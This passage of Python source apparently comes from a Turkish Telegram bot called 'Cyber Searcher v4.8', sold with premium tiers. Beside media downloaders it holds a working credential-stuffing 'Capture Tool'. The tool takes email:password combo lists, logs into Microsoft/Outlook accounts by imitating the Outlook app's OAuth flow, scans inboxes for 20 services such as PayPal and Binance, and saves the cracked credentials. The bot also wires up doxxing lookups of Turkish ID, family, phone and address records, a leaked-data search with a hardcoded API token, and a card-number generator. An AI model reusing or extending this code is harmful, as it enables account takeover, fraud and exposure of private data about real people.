    except: ffmpeg_available = False
    if ffmpeg_available:
        formats = [{'format':'bestaudio/best','postprocessors':[{'key':'FFmpegExtractAudio','preferredcodec':'mp3','preferredquality':'192'}]}]
    else:
        formats = [{'format':'bestaudio[ext=m4a]/bestaudio[ext=webm]/bestaudio/best'}]
    last_error = None; info = None; dosya_adi = None
    for opts in formats:
        try:
            ydl_opts = _ytdlp_common_opts()
            ydl_opts.update({'outtmpl':'muzikler/%(id)s.%(ext)s','max_filesize':50*1024*1024})
            ydl_opts.update(opts)
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                info = ydl.extract_info(url, download=True)
                dosya_adi = ydl.prepare_filename(info)
                base, _ = os.path.splitext(dosya_adi)
                for ext in [".mp3",".m4a",".webm",".opus",".ogg"]:
                    if os.path.exists(base + ext): dosya_adi = base + ext; break
                if dosya_adi and os.path.exists(dosya_adi): break
                else: dosya_adi = None
        except Exception as e: last_error = str(e); continue
    if not dosya_adi or not os.path.exists(dosya_adi):
        return {"ok": False, "error": f"❌ İndirme başarısız: {esc(last_error or 'bilinmeyen')}"}
    size = os.path.getsize(dosya_adi)
    if size > 50 * 1024 * 1024:
        try: os.remove(dosya_adi)
        except: pass
        return {"ok": False, "error": f"❌ Çok büyük ({size/(1024*1024):.1f}MB)."}
    if size < 1024:
        try: os.remove(dosya_adi)
        except: pass
        return {"ok": False, "error": "❌ Dosya bozuk."}
    return {"ok":True,"path":dosya_adi,"title":info.get("title","Bilinmeyen"),
            "uploader":info.get("uploader","Bilinmiyor"),
            "duration":info.get("duration") or 0,
            "thumbnail":info.get("thumbnail"),"url":url}

def _process_music(msg, bot_instance):
    uid = msg.from_user.id
    if is_banned(uid):
        bot_instance.reply_to(msg, f"🚫 <b>YASAKLANDINIZ!</b>\nSebep: {esc(get_ban_reason(uid))}", parse_mode="HTML")
        return
    parts = msg.text.split(' ', 1)
    if len(parts) < 2:
        bot_instance.reply_to(msg,
            "🎵 <b>Müzik İndirici</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "📌 <b>Kullanım:</b>\n"
            "<code>/sarki Sanatçı Şarkı</code>", parse_mode="HTML")
        return
    sorgu = parts[1].strip()
    durum = bot_instance.reply_to(msg, f"🔍 <code>{esc(sorgu)}</code> aranıyor...", parse_mode="HTML")
    try:
        bot_instance.edit_message_text(f"🎧 <b>İndiriliyor...</b>", msg.chat.id, durum.message_id, parse_mode="HTML")
        result = _muzik_indir(sorgu)
        if not result["ok"]:
            bot_instance.edit_message_text(result.get("error","❌ Hata!"), msg.chat.id, durum.message_id, parse_mode="HTML")
            return
        baslik = result["title"]; sanatci = result["uploader"]
        sure = result["duration"]; sure_txt = f"{int(sure//60)}:{int(sure%60):02d}" if sure else "?"
        thumb_path = None
        if result.get("thumbnail"):
            try:
                td = requests.get(result["thumbnail"], timeout=10, verify=False).content
                thumb_path = f"muzikler/thumb_{uid}_{int(time.time())}.jpg"
                with open(thumb_path, "wb") as f: f.write(td)
            except: thumb_path = None
        ext = os.path.splitext(result["path"])[1].replace(".","") or "m4a"
        caption = (f"🎵 <b>{esc(baslik)}</b>\n"
                   f"━━━━━━━━━━━━━━━━━━━━━\n"
                   f"👤 <b>Sanatçı:</b> {esc(sanatci)}\n"
                   f"⏱ <b>Süre:</b> {sure_txt}\n"
                   f"💽 <b>Format:</b> .{ext}")
        with open(result["path"], "rb") as sarki:
            thumb_file = open(thumb_path, "rb") if thumb_path and os.path.exists(thumb_path) else None
            try:
                bot_instance.send_audio(msg.chat.id, sarki, caption=caption,
                                        title=baslik[:60], performer=sanatci[:60],
                                        duration=int(sure) if sure else 0, thumb=thumb_file,
                                        parse_mode="HTML")
            finally:
                if thumb_file: thumb_file.close()
                try: os.remove(result["path"])
                except: pass
                if thumb_path and os.path.exists(thumb_path):
                    try: os.remove(thumb_path)
                    except: pass
        try: bot_instance.delete_message(msg.chat.id, durum.message_id)
        except: pass
    except Exception as e:
        try: bot_instance.edit_message_text(f"❌ <b>Hata:</b> <code>{esc(e)}</code>", msg.chat.id, durum.message_id, parse_mode="HTML")
        except: bot_instance.reply_to(msg, f"❌ Hata: {esc(e)}", parse_mode="HTML")

# ══════════════════════════════════════════════════════════════
#  🎥 VİDEO
# ══════════════════════════════════════════════════════════════
def _download_video(link):
    os.makedirs("downloads", exist_ok=True)
    ydl_opts = _ytdlp_common_opts()
    ydl_opts.update({
        "format": "bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best",
        "outtmpl": os.path.join("downloads", "%(id)s.%(ext)s"),
        "max_filesize": 50 * 1024 * 1024,
    })
    try:
        with YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(link, download=True)
            if "requested_downloads" in info and info["requested_downloads"]:
                path = info["requested_downloads"][0]["filepath"]
            else: path = ydl.prepare_filename(info)
            if not os.path.exists(path):
                base, _ = os.path.splitext(path)
                for ext in [".mp4",".mkv",".webm"]:
                    if os.path.exists(base + ext): path = base + ext; break
            if not os.path.exists(path): return {"ok": False, "err": "Dosya bulunamadı."}
            size = os.path.getsize(path)
            if size > 50 * 1024 * 1024:
                os.remove(path)
                return {"ok": False, "err": f"Çok büyük ({size / (1024*1024):.1f}MB)."}
            return {"ok": True, "path": path, "title": info.get("title", "Video"),
                    "size": f"{size / (1024 * 1024):.1f}MB", "dur": info.get("duration", "?"),
                    "upl": info.get("uploader", "?")}
    except Exception as e:
        return {"ok": False, "err": esc(e)}

def _process_video(msg, bot_instance):
    uid = msg.from_user.id
    link = msg.text.strip()
    if not link.startswith(("http://", "https://")):
        bot_instance.reply_to(msg, "❌ Geçerli link gir!", parse_mode="HTML"); return
    sm = bot_instance.reply_to(msg, "⏳ İndiriliyor...", parse_mode="HTML")
    res = _download_video(link)
    if not res["ok"]:
        bot_instance.edit_message_text(f"❌ İndirilemedi:\n<code>{esc(res['err'])}</code>", msg.chat.id, sm.message_id, parse_mode="HTML")
        return
    cap = f"🎥 <b>{esc(res['title'][:60])}</b>\n📦 {res['size']}  ⏱ {res['dur']}s  👤 {esc(res['upl'])}"
    try:
        with open(res["path"], "rb") as f:
            bot_instance.send_video(msg.chat.id, f, caption=cap, supports_streaming=True, timeout=120, parse_mode="HTML")
    except Exception as e:
        bot_instance.edit_message_text(f"❌ Hata: {esc(e)}", msg.chat.id, sm.message_id, parse_mode="HTML")
    finally:
        if os.path.exists(res["path"]): os.remove(res["path"])
        try: bot_instance.delete_message(msg.chat.id, sm.message_id)
        except: pass

# ══════════════════════════════════════════════════════════════
#  CAPTURE TOOL
# ══════════════════════════════════════════════════════════════
CAPTURE_APPS = {
    1:'security@facebookmail.com', 2:'security@mail.instagram.com', 3:'noreply@pubgmobile.com',
    4:'nintendo-noreply@ccg.nintendo.com', 5:'register@account.tiktok.com', 6:'info@x.com',
    7:'service@paypal.com.br', 8:'do-not-reply@ses.binance.com', 9:'info@account.netflix.com',
    10:'reply@txn-email.playstation.com', 11:'noreply@id.supercell.com', 12:'help@acct.epicgames.com',
    13:'no-reply@spotify.com', 14:'noreply@rockstargames.com', 15:'xboxreps@engage.xbox.com',
    16:'account-security-noreply@accountprotection.microsoft.com', 17:'noreply@steampowered.com',
    18:'accounts@roblox.com', 19:'EA@e.ea.com', 20:'no-reply@bitkub.com'
}
CAPTURE_NAMES = {
    1:"Facebook",2:"Instagram",3:"PUBG",4:"Konami",5:"TikTok",6:"Twitter",7:"PayPal",8:"Binance",
    9:"Netflix",10:"PlayStation",11:"Supercell",12:"Epic Games",13:"Spotify",14:"Rockstar",15:"Xbox",
    16:"Microsoft",17:"Steam",18:"Roblox",19:"EA Sports",20:"Bitkub"
}
CAPTURE_RUNNING = False
CAPTURE_LOCK = threading.Lock()
CAPTURE_RESULTS = {}
CAPTURE_HIT = 0; CAPTURE_BAD = 0; CAPTURE_PROCESSED = 0

def capture_keyboard(user_id):
    mk = InlineKeyboardMarkup(row_width=2)
    is_prem = is_premium(user_id)
    mk.add(_sep("📸 PLATFORM SEÇİNİZ"))
    if is_prem: mk.add(_btn("📸 Tüm Platformlar ⭐", "capture_all"))
    else: mk.add(_btn("📸 Tüm Platformlar 🔒", "noop"))
    for i in range(1, 21, 2):
        if i + 1 <= 20:
            mk.add(_btn(f"{i}. {CAPTURE_NAMES[i]}", f"capture_{i}"), _btn(f"{i+1}. {CAPTURE_NAMES[i+1]}", f"capture_{i+1}"))
        else: mk.add(_btn(f"{i}. {CAPTURE_NAMES[i]}", f"capture_{i}"))
    if not is_prem:
        mk.add(_sep(f"📊 Kalan: {get_capture_limit_text(user_id)}/{FREE_CAPTURE_LIMIT}"))
        mk.add(_btn("⭐ Premium Satın Al (400⭐)", "buy_premium"))
    mk.add(_btn("◀️ Geri", "goto_hotmail"))
    return mk

def capture_get_token(email, password):
    try:
        headers = {"Connection":"keep-alive","Upgrade-Insecure-Requests":"1",
            "User-Agent":"Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "return-client-request-id":"false","client-request-id":"205740b4-7709-4500-a45b-b8e12f66c738",
            "x-ms-sso-ignore-sso":"1","correlation-id":str(uuid.uuid4()),
            "x-client-ver":"1.1.0+9e54a0d1","x-client-os":"28",
            "x-client-sku":"MSAL.xplat.android","x-client-src-sku":"MSAL.xplat.android",
            "X-Requested-With":"com.microsoft.outlooklite",
            "Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.9"}
        response = requests.get("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint="+str(email)+"&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D", headers=headers)
        cookies = response.cookies.get_dict()
        url = response.text.split("urlPost:'")[1].split("'")[0]
        ppft = response.text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]
        ad = response.url.split('haschrome=1')[0]
        data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
        login_headers = {"Host":"login.live.com","Connection":"keep-alive","Content-Length":str(len(data)),
            "Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","Origin":"https://login.live.com",
            "Content-Type":"application/x-www-form-urlencoded",
            "User-Agent":"Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "X-Requested-With":"com.microsoft.outlooklite",
            "Referer":f"{ad}haschrome=1","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.9",
            "Cookie":f"MSPRequ={cookies['MSPRequ']};uaid={cookies['uaid']}; RefreshTokenSso={cookies['RefreshTokenSso']}; MSPOK={cookies['MSPOK']}; OParams={cookies['OParams']}; MicrosoftApplicationsTelemetryDeviceId={uuid}"}
        res = requests.post(url, data=data, headers=login_headers, allow_redirects=False)
        cookies = res.cookies.get_dict(); headers = res.headers
        if any(key in cookies for key in ["JSH","JSHP","ANON","WLSSC"]) or res.text == '':
            code = headers.get('Location','').split('code=')[1].split('&')[0] if 'code=' in headers.get('Location','') else None
            cid = cookies.get('MSPCID','').upper()
            if code and cid:
                token_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
                td = {"client_info":"1","client_id":"e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                      "redirect_uri":"msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                      "grant_type":"authorization_code","code":code,
                      "scope":"profile openid offline_access https://outlook.office.com/M365.Access"}
                tr = requests.post(token_url, data=td, headers={"Content-Type":"application/x-www-form-urlencoded"})
                return tr.json().get("access_token"), cid
        return None, None
    except: return None, None

def capture_get_info(email, password, token, cid, target_app=None):
    try:
        headers = {"User-Agent":"Outlook-Android/2.0","Authorization":f"Bearer {token}",
                   "X-AnchorMailbox":f"CID:{cid}","Host":"substrate.office.com"}
        r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers).json()
        name = r.get('names',[{}])[0].get('displayName','Bilinmiyor')
        location = r.get('accounts',[{}])[0].get('location','Bilinmiyor')
        url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
        h2 = {"Host":"outlook.live.com","content-length":"0","x-owa-sessionid":f"{cid}",
              "x-req-source":"Mini","authorization":f"Bearer {token}","action":"StartupData",
              "x-owa-correlationid":f"{cid}","content-type":"application/json; charset=utf-8"}
        rese = requests.post(url, headers=h2, data="").text
        found_apps = []
        for num, app_mail in CAPTURE_APPS.items():
            if app_mail in rese: found_apps.append(CAPTURE_NAMES[num])
        return {"success":True,"name":name,"country":location,"apps":found_apps,"email":email,"password":password}
    except: return {"success": False}

def capture_worker(line, user_id, user_name, is_premium, target_app=None):
    global CAPTURE_HIT, CAPTURE_BAD, CAPTURE_PROCESSED
    try:
        if ":" not in line:
            with CAPTURE_LOCK: CAPTURE_BAD += 1; CAPTURE_PROCESSED += 1
            return
        email, password = line.split(":", 1)
        email = email.strip(); password = password.strip()
        if not email or not password:
            with CAPTURE_LOCK: CAPTURE_BAD += 1; CAPTURE_PROCESSED += 1
            return
        token, cid = capture_get_token(email, password)
        if not token or not cid:
            with CAPTURE_LOCK: CAPTURE_BAD += 1; CAPTURE_PROCESSED += 1
            return
        result = capture_get_info(email, password, token, cid, target_app)
        if result.get("success"):
            apps = result.get("apps", [])
            if target_app:
                tn = None
                for num, am in CAPTURE_APPS.items():
                    if am == target_app: tn = CAPTURE_NAMES[num]; break
                if tn and tn not in apps:
                    with CAPTURE_LOCK: CAPTURE_BAD += 1; CAPTURE_PROCESSED += 1
                    return
            with CAPTURE_LOCK:
                CAPTURE_HIT += 1
                if user_id not in CAPTURE_RESULTS: CAPTURE_RESULTS[user_id] = []
                CAPTURE_RESULTS[user_id].append(result)
            with open(f"capture_hits_{user_id}.txt", "a", encoding="utf-8") as f:
                f.write(f"Email: {email}\nPassword: {password}\nName: {result.get('name')}\n"
                        f"Country: {result.get('country')}\nApps: {', '.join(apps)}\n{'-'*40}\n")
        else:
            with CAPTURE_LOCK: CAPTURE_BAD += 1
    except:
        with CAPTURE_LOCK: CAPTURE_BAD += 1
    finally:
        with CAPTURE_LOCK: CAPTURE_PROCESSED += 1

def start_capture_scan(combo_list, user_id, user_name, is_premium, target_app=None):
    global CAPTURE_RUNNING, CAPTURE_HIT, CAPTURE_BAD, CAPTURE_PROCESSED
    with CAPTURE_LOCK:
        CAPTURE_RUNNING = True; CAPTURE_HIT = 0; CAPTURE_BAD = 0
        CAPTURE_PROCESSED = 0; CAPTURE_RESULTS[user_id] = []
    try:
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for line in combo_list[:1000]:
                futures.append(executor.submit(capture_worker, line, user_id, user_name, is_premium, target_app))
            for future in as_completed(futures):
                try: future.result()
                except: pass
    finally:
        with CAPTURE_LOCK: CAPTURE_RUNNING = False

# ══════════════════════════════════════════════════════════════
#  LANGUAGE / STRINGS
# ══════════════════════════════════════════════════════════════
def lang(user_id):
    l = db_get(user_id, "language")
    return l if l in ("tr", "en", "ar") else "tr"

def s(user_id, key, **kw):
    l = lang(user_id)
    txt = S.get(l, S["tr"]).get(key, key)
    return txt.format(**kw) if kw else txt

S = {
    "tr": {
        "welcome": "🌟 <b>Cyber Searcher v4.8</b>\nHoşgeldin, <b>{name}</b>!\n📌 Durum: {status}\n🔻 Aşağıdan işlem seç:",
        "free": "🆓 Ücretsiz", "premium": "⭐ PREMIUM",
        "select_op": "🛠 Kullanmak istediğin aracı seç:",
        "combo_ask": "🌐 Domain gir (Örn: netflix.com) veya (netflix.com 100):",
        "searching": "🔍 <b>{domain}</b> taranıyor...",
        "no_result": "❌ {domain} için sonuç yok.",
        "combo_caption": "✅ <b>{domain}</b> | <b>{count}</b> Hesap\nAPI: {apis}",
        "stats_title": "📊 <b>İSTATİSTİKLERİN</b>",
        "lb_title": "🏆 <b>LİDER TABLOSU</b>",
        "no_stats": "📊 Henüz sorgu yapmadınız!",
        "api_title": "⚙️ <b>API DEĞİŞTİR</b>\n📌 Mevcut: <b>{cur}</b>",
        "lang_pick": "🌍 Dil seçin / Select language / اختر لغتك",
        "lang_ok": "✅ Dil seçildi!",
        "premium_title": "⭐ <b>PREMIUM ÜYELİK</b>",
        "premium_price_txt": "💰 Fiyat: <b>{price} Telegram Yıldızı</b>",
        "premium_dur": "♾️ Süre: <b>Sınırsız (Ömür Boyu)</b>",
        "premium_features": "🎯 <b>PREMIUM ÖZELLİKLER</b>\n• 📧 Sınırsız Hotmail\n• 📸 Sınırsız Capture\n• 🔖 Sınırsız Keyword\n• 🌍 Sınırsız OSINT\n• 🆔 Sınırsız TG-ID\n• 🎨 Sınırsız AI Image",
        "osint_price": "💰 OSINT Premium: 200 Yıldız",
        "already_premium": "⭐ Zaten Premium üyesiniz!",
        "back_btn": "◀️ Geri", "home_btn": "🏠 Ana Menü", "tools_btn": "🛠 Araçlar",
        "video_ask": "🎥 Video linkini gönder:", "video_wait": "⏳ İndiriliyor...",
        "video_err": "❌ İndirilemedi:\n<code>{err}</code>",
        "invalid_link": "❌ Geçerli link gir!",
        "ls_ask": "{icon} <b>LeakSights — {tool}</b>\n📥 Sorgu değerini gir:",
        "ls_caption": "📋 LeakSights ⭐\n🔍 Aranan: <code>{val}</code>",
        "tr_ask": "{prompt}\n📌 Sonuç TXT olarak gelir.",
        "tr_caption": "📋 {tool} Sorgu\n🔍 Param: <code>{param}</code>",
        "processing": "🔄 Sorgulanıyor...",
        "admin_only": "❌ Bu komut sadece admin içindir!",
        "invalid_tc": "❌ Geçersiz TC!",
        "invalid_gsm": "❌ Geçersiz GSM!",
        "invalid_adsoyad": "❌ Ad Soyad gir!",
        "invalid_adaparsel": "❌ İl,İlçe formatında gir!",
        "multi_bot_list": "🤖 <b>BOT LİSTESİ</b>",
        "multi_bot_running": "🟢 Aktif", "multi_bot_stopped": "🔴 Durduruldu",
        "multi_bot_total": "📊 Toplam: {count} bot",
        "multi_bot_added": "✅ Bot başlatıldı!\n🔑 <code>{token}</code>",
        "multi_bot_exists": "⚠️ Token zaten çalışıyor!",
        "multi_bot_no_bots": "📭 Bot kaydı yok.",
        "multi_bot_add_usage": "❌ Kullanım: /addbot BOT_TOKEN",
        "php2py": "🐍 PHP→Python Çevirici",
        "help_content": (
            "📖 <b>YARDIM MENÜSÜ (v4.8)</b>\n"
            "📌 Durumunuz: {status}\n"
            "══════════════════════\n"
            "🔹 <b>SORGU SİSTEMLERİ</b> (🆓):\n"
            "   • 🆔 TC • 🔍 TC Pro • 👤 Ad Soyad\n"
            "   • 👨‍👩‍👧 Aile • 🌳 Sülale\n"
            "   • 📱 TC→GSM • 📞 GSM→TC\n"
            "   • 🎓 E-Okul • 🏠 Tapu • 🗺️ Ada Parsel • 🏠 Adres\n"
            "🔹 <b>🆔 TELEGRAM ID SORGU</b>:\n"
            "   • 🆓 Free: 5 sorgu\n"
            "   • 💰 25→89⭐ / 50→180⭐ / 100→250⭐\n"
            "   • ⭐ Premium: Sınırsız\n"
            "🔹 <b>🎨 AI IMAGE GENERATOR</b>:\n"
            "   • 🆓 Free: 2 hak\n"
            "   • 💎 25→89⭐ / 50→200⭐ / 250→600⭐\n"
            "   • ⭐ Premium: Sınırsız\n"
            "🔹 <b>⭐ PREMIUM:</b>\n"
            "   • 🌟 400⭐ → Sınırsız her şey\n"
            "   • 🌍 200⭐ → OSINT\n"
            "👨‍💻 coded by: @hackledin"
        ),
    },
    "en": {
        "welcome": "🌟 <b>Cyber Searcher v4.8</b>\nWelcome, <b>{name}</b>!\n📌 Status: {status}",
        "free": "🆓 Free", "premium": "⭐ PREMIUM",
        "osint_price": "💰 OSINT Premium: 200 Stars",
        "help_content": "📖 <b>HELP (v4.8)</b>\n📌 Status: {status}\n🔹 Premium • TG-ID • AI\n👨‍💻 @hackledin",
    },
    "ar": {
        "welcome": "🌟 <b>Cyber Searcher v4.8</b>\nمرحباً، <b>{name}</b>!\n📌 الحالة: {status}",
        "free": "🆓 مجاني", "premium": "⭐ بريميوم",
        "osint_price": "💰 OSINT بريميوم: 200 نجمة",
        "help_content": "📖 <b>مساعدة (v4.8)</b>\n📌 {status}\n👨‍💻 @hackledin",
    },
}

# ══════════════════════════════════════════════════════════════
#  KEYBOARDS
# ══════════════════════════════════════════════════════════════
def main_kb(user_id):
    l = lang(user_id)
    labels = {
        "tr": ["📦 Combo Çek", "🛠 Araçlar", "📊 İstatistik", "👤 Profil", "🏆 Lider Tablosu", "⚙️ API Değiştir", "❓ Yardım"],
        "en": ["📦 Combo", "🛠 Tools", "📊 Stats", "👤 Profile", "🏆 Leaderboard", "⚙️ API", "❓ Help"],
        "ar": ["📦 كومبو", "🛠 الأدوات", "📊 الإحصائيات", "👤 الملف", "🏆 المتصدرون", "⚙️ API", "❓ مساعدة"],
    }
    btns = labels.get(l, labels["tr"])
    mk = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    mk.add(*[KeyboardButton(b) for b in btns])
    return mk

def _btn(txt, cd): return InlineKeyboardButton(txt, callback_data=cd)
def _sep(txt): return InlineKeyboardButton(f"─── {txt} ───", callback_data="noop")

def hotmail_keyboard(user_id):
    mk = InlineKeyboardMarkup(row_width=2)
    keywords = get_user_keywords(user_id)
    limit_text = get_keyword_limit_text(user_id)
    is_prem = is_premium(user_id)
    mk.add(_sep("📧 HOTMAIL CHECKER"))
    if is_prem: mk.add(_btn("🚀 Hotmail Tarama ⭐", "hotmail_start"))
    else: mk.add(_btn("📧 Hotmail Tarama (3000 satır)", "hotmail_start"))
    mk.add(_sep(f"🔖 KEYWORDLER ({len(keywords)}/{limit_text})"))
    for kw in keywords[:10]: mk.add(_btn(f"📌 {kw}", "noop"))
    mk.add(_btn("➕ Keyword Ekle", "hotmail_addkw"))
    mk.add(_btn("🗑️ Keyword Sil", "hotmail_delkw"))
    mk.add(_btn("🔄 Sıfırla", "hotmail_resetkw"))
    mk.add(_sep("📸 CAPTURE TOOL"))
    if is_prem: mk.add(_btn("📸 Capture Tarama ⭐", "capture_menu"))
    else: mk.add(_btn(f"📸 Capture ({get_capture_limit_text(user_id)} kullanım)", "capture_menu"))
    if is_prem: mk.add(_btn("⭐ Premium Aktif ✅", "noop"))
    else: mk.add(_btn("⭐ Premium Satın Al (400⭐)", "buy_premium"))
    mk.add(_btn(s(user_id, "back_btn"), "goto_tools"))
    return mk

API_LIST = [
    {"name": "Wazely API", "url": "https://wazely.vercel.app/api/trlog?site=", "type": "wazely"},
    {"name": "Solidar API", "url": "https://solidarksystems.alwaysdata.net/log.php?url=", "type": "solidar"},
    {"name": "RootTurkey API", "url": "https://rootturkey.xyz/log?url=", "type": "rootturkey"},
]
YASAKLI = [".gov", ".edu", "cheatglobal", "spin", "bet"]

TURKIYE_API = {
    "tc": {"url": "https://ajaxsystems.fun/tc.php?tc={tc}", "icon": "🆔", "tr": "TC Sorgu", "en": "TC", "ar": "TC"},
    "tcpro": {"url": "https://ajaxsystems.fun/tcpro.php?tc={tc}", "icon": "🔍", "tr": "TC Pro", "en": "TC Pro", "ar": "TC Pro"},
    "adsoyad": {"url": "https://ajaxsystems.fun/adsoyad.php?ad={ad}&soyad={soyad}", "icon": "👤", "tr": "Ad Soyad", "en": "Name", "ar": "الاسم"},
    "aile": {"url": "https://ajaxsystems.fun/aile.php?tc={tc}", "icon": "👨‍👩‍👧", "tr": "Aile", "en": "Family", "ar": "العائلة"},
    "ailepro": {"url": "https://ajaxsystems.fun/ailepro.php?tc={tc}", "icon": "👨‍👩‍👧‍👦", "tr": "Aile Pro", "en": "Family Pro", "ar": "العائلة Pro"},
    "sulale": {"url": "https://ajaxsystems.fun/sulale.php?tc={tc}", "icon": "🌳", "tr": "Sülale", "en": "Lineage", "ar": "النسب"},
    "tcgsm": {"url": "https://ajaxsystems.fun/tcgsm.php?tc={tc}&auth=fire", "icon": "📱", "tr": "TC→GSM", "en": "TC→GSM", "ar": "TC→GSM"},
    "gsmtc": {"url": "https://ajaxsystems.fun/gsmtc.php?gsm={gsm}&auth=fire", "icon": "📞", "tr": "GSM→TC", "en": "GSM→TC", "ar": "GSM→TC"},
    "eokul": {"url": "https://ajaxsystems.fun/eokul.php?tc={tc}", "icon": "🎓", "tr": "E-Okul", "en": "E-School", "ar": "المدرسة"},
    "tapu": {"url": "https://ajaxsystems.fun/tapu.php?tc={tc}", "icon": "🏠", "tr": "Tapu", "en": "Title", "ar": "الملكية"},
    "adaparsel": {"url": "https://ajaxsystems.fun/adaparsel.php?il={il}&ilce={ilce}", "icon": "🗺️", "tr": "Ada Parsel", "en": "Block", "ar": "القطعة"},
    "adres": {"url": "https://apiv2.ajaxsystems.fun/adres.php?tc={tc}", "icon": "🏠", "tr": "Adres", "en": "Address", "ar": "العنوان"},
}

LS_TOKEN = "NHLpkXyN8Lq3AkkjA5yECyMu5lpA0l0GqnY0Co8kBwh9eIeOJg"
LS_BASE = "https://api.leaksights.com/osint"

def _lsurl(endpoint):
    return f"{LS_BASE}/{endpoint}?token={LS_TOKEN}&text={{value}}"

LEAKSIGHTS_API = {
    "username": {"url": _lsurl("username"), "icon": "👤", "cat": "username", "tr": "Kullanıcı Adı", "en": "Username", "ar": "المستخدم"},
    "email": {"url": _lsurl("email"), "icon": "📧", "cat": "contact", "tr": "E-posta", "en": "Email", "ar": "البريد"},
    "number": {"url": _lsurl("number"), "icon": "📱", "cat": "contact", "tr": "Telefon", "en": "Phone", "ar": "الهاتف"},
    "ip": {"url": _lsurl("ip"), "icon": "🌐", "cat": "ip", "tr": "IP Sızıntı", "en": "IP Leak", "ar": "IP"},
    "ipgeo": {"url": _lsurl("ipgeo"), "icon": "📍", "cat": "ip", "tr": "IP Konum", "en": "IP Location", "ar": "موقع IP"},
    "hwid": {"url": _lsurl("hwid"), "icon": "💻", "cat": "ip", "tr": "HWID", "en": "HWID", "ar": "HWID"},
    "url": {"url": _lsurl("url"), "icon": "🔗", "cat": "url", "tr": "URL Sızıntı", "en": "URL Leak", "ar": "URL"},
    "cpf": {"url": _lsurl("cpf"), "icon": "🆔", "cat": "identity", "tr": "CPF", "en": "CPF", "ar": "CPF"},
    "password": {"url": _lsurl("password"), "icon": "🔑", "cat": "other", "tr": "Şifre", "en": "Password", "ar": "كلمة المرور"},
    "placa": {"url": _lsurl("placa"), "icon": "🚗", "cat": "other", "tr": "Plaka", "en": "Plate", "ar": "اللوحة"},
}

LEAKSIGHTS_CATS = {
    "username": {"tr": "👤 KULLANICI ADI", "en": "👤 USERNAME", "ar": "👤 المستخدم"},
    "contact": {"tr": "📱 İLETİŞİM", "en": "📱 CONTACT", "ar": "📱 الاتصال"},
    "ip": {"tr": "🌐 IP / AĞ", "en": "🌐 IP", "ar": "🌐 IP"},
    "url": {"tr": "🔗 URL", "en": "🔗 URL", "ar": "🔗 URL"},
    "identity": {"tr": "🛂 KİMLİK", "en": "🛂 ID", "ar": "🛂 الهوية"},
    "other": {"tr": "🔧 DİĞER", "en": "🔧 OTHER", "ar": "🔧 أخرى"},
}

TOOLS_API = {
    "bedrock": "https://wazelyapi.vercel.app/api/bedrock?adres=",
    "ccgen": "https://wazelyapi.vercel.app/api/ccgen?bin=",
    "dctoken": "https://wazelyapi.vercel.app/api/dcbottokencheck?token=",
    "tgtoken": "https://wazelyapi.vercel.app/api/tgtokencheck?token=",
    "eczane": "https://wazely.vercel.app/api/eczane?ad=",
    "ipinfo": "https://wazely.vercel.app/api/ipinfo?ip=",
    "dns": "https://wazely.vercel.app/api/dns?domain=",
    "bahis": "https://wazely.vercel.app/api/bahis?isimsoyisim=",
    "plaka": "https://wazely.vercel.app/api/plaka?plate=",
    "predunyam": "https://wazely.vercel.app/api/predunyam",
}

TOOL_PROMPTS = {
    "tr": {"bedrock": "🎮 IP:PORT girin:", "ccgen": "💳 BIN girin:", "dctoken": "🤖 DC Token girin:",
           "tgtoken": "✈️ TG Token girin:", "eczane": "💊 Eczane:", "ipinfo": "🌐 IP:",
           "dns": "🔎 Domain:", "bahis": "⚽ İsim Soyisim:", "plaka": "🚗 Plaka:",
           "proxycheck": "🛡️ IP:", "urlscan": "🔍 Domain:", "addbot": "🤖 Bot Token:"},
    "en": {"bedrock": "IP:PORT", "ccgen": "BIN", "dctoken": "DC Token", "tgtoken": "TG Token",
           "eczane": "Pharmacy", "ipinfo": "IP", "dns": "Domain", "bahis": "Name", "plaka": "Plate",
           "proxycheck": "IP", "urlscan": "Domain", "addbot": "Bot Token"},
    "ar": {"bedrock": "IP:PORT", "ccgen": "BIN", "dctoken": "DC Token", "tgtoken": "TG Token",
           "eczane": "صيدلية", "ipinfo": "IP", "dns": "النطاق", "bahis": "الاسم", "plaka": "اللوحة",
           "proxycheck": "IP", "urlscan": "النطاق", "addbot": "توكن"},
}

TURKEY_PROMPTS = {
